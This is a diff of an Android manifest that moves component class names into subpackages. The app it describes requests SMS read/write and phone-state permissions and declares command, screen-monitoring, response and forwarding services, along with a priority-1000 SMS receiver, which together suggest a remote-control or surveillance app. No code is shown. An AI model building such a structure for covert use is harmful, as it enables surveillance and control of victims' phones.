@@ -10,14 +10,14 @@
     <uses-permission android:name="android.permission.READ_SMS"></uses-permission>
     <uses-permission android:name="android.permission.WRITE_SMS"></uses-permission>    
     <uses-permission android:name="android.permission.MODIFY_PHONE_STATE"></uses-permission>
-    
+   
     
 
     <application 
     		android:icon="@drawable/icon" 
     		android:label="@string/app_name">
     		
-    		<activity android:name=".NetCommand"
+    		<activity android:name=".ReceiverComponent.NetCommand"
                   android:label="@string/NetCommand">
             	<intent-filter>
                 	<action android:name="android.intent.action.VIEW" />
@@ -28,7 +28,7 @@
             </activity>
     		
             <service 
-                android:name=".CommandService"
+                android:name=".CommandComponent.CommandService"
                 android:label="@string/CommandService">
                 <intent-filter>
                         <action android:name="android.intent.action.MAIN"/>
@@ -37,7 +37,7 @@
             </service>            
             
             <service 
-                android:name=".ScreenMonitor"
+                android:name=".ReceiverComponent.ScreenMonitor"
                 android:label="@string/ScreenMonitor">
                 <intent-filter>
                         <action android:name="android.intent.action.MAIN"/>
@@ -46,7 +46,7 @@
             </service>
             
             <service 
-                android:name=".ResponseService"
+                android:name=".CommandComponent.ResponseService"
                 android:label="@string/ResponseService">
                 <intent-filter>
                         <action android:name="android.intent.action.MAIN"/>
@@ -55,7 +55,7 @@
             </service>
          
             <service 
-                android:name=".FowardService"
+                android:name=".CommandComponent.FowardService"
                 android:label="@string/FowardService">
                 <intent-filter>
                         <action android:name="android.intent.action.MAIN"/>
@@ -64,13 +64,13 @@
             </service>
             
         	
-        	<receiver android:name=".SmsReceiver"> 
+        	<receiver android:name=".ReceiverComponent.SmsReceiver"> 
             	<intent-filter android:priority="1000">            	 
                 	<action android:name="android.provider.Telephony.SMS_RECEIVED"/> 
             	</intent-filter> 
         	</receiver>
         	
-        	<receiver android:name=".CommandRestartReceiver"> 
+        	<receiver android:name=".AuxiliaryComponent.CommandRestartReceiver"> 
             	<intent-filter>            	 
                 	<action android:name="CommandService.stillJob"/> 
             	</intent-filter> 
